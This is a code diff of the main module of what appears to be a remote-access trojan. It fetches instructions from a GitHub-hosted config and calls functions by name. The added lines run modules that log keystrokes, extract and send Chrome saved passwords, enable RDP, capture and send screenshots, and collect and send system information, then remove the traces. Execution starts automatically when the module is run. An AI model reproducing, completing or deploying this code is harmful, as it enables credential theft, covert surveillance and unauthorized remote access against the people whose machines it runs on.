@@ -1,6 +1,8 @@
 from screenshot import screenshot
 from sysinfo import sysinfo
 from keylogger import keylogger
+from chromepasswords import chromepasswords
+from rdp import RDPEnabler
 import base64
 import json
 import requests
@@ -10,18 +12,9 @@ import os
 
 load_dotenv()
 
-#Vars
+#GLOBALS
 REPO = os.getenv("repo")
 CONFIG_FILE = os.getenv("config-file")
-
-#Test functions:
-class t():
-    def f1(self):
-        print('1')
-def f64():
-    print('64')
-def f01():
-    print('120')
 
 def fetch_config(repo_url: str, config_file: str) -> Dict:
     #Fetches the config file from a GitHub repository and returns its contents as a dictionary.
@@ -43,3 +36,39 @@ def run_functions(repo_url: str, config_file: str):
             method()
         else:
             globals()[function_name]()
+
+def mod_keylogger():
+    # Keylogger duration is set to 60s:
+    k = keylogger(duration=10)
+    k.start()
+    k.sendfile()
+    k.remove()
+
+def mod_chromepasswords():
+    cp = chromepasswords()
+    cp.get_passwords()
+    cp.write_passwords()
+    cp.send_passwords()
+    cp.remove()
+
+def mod_rdp():
+    rdp = RDPEnabler()
+    rdp.enable_rdp()
+
+def mod_screenshot():
+    s = screenshot()
+    s.save()
+    s.send()
+    s.remove()
+
+def mod_systeminfo():
+    s = sysinfo()
+    s.getInfo()
+    s.write()
+    s.send()
+    s.remove()
+
+def main():
+    run_functions(REPO, CONFIG_FILE)
+
+main()
